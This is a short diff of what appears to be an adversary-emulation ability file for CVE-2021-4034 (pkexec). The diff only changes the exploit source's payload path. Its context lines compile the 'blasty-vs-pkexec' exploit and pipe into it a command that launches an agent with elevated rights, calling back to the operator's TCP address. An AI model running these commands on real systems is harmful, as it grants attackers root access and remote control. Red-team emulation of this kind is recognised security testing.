@@ -13,7 +13,7 @@ platforms:
         gcc blasty-vs-pkexec.c -o /tmp/blasty-vs-pkexec
         chmod +x /tmp/blasty-vs-pkexec
         echo 'nohup #{agent.location} -address #{operator.tcp} -range elevated >/dev/null 2>&1 &' | /tmp/blasty-vs-pkexec
-      payload: '#{operator.payloads}/CVE-2021-4034/blasty-vs-pkexec.c'
+      payload: 'blasty-vs-pkexec.c'
 metadata:
   authors:
     - VVX7
